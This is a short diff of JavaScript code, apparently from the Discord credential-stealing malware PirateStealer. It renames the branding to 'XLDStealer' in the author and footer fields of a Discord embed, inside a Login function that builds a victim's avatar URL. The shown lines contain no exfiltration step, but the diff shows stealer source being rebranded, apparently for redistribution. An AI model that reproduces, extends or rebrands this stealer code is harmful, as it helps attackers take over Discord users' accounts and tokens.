@@ -358,8 +358,8 @@ function Login(e, t, n) {
                             inline: !1,
                           },
                         ],
-                        author: { name: "PirateStealer" },
-                        footer: { text: "PirateStealer" },
+                        author: { name: "XLDStealer" },
+                        footer: { text: "XLDStealer" },
                         thumbnail: {
                           url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`,
                         },
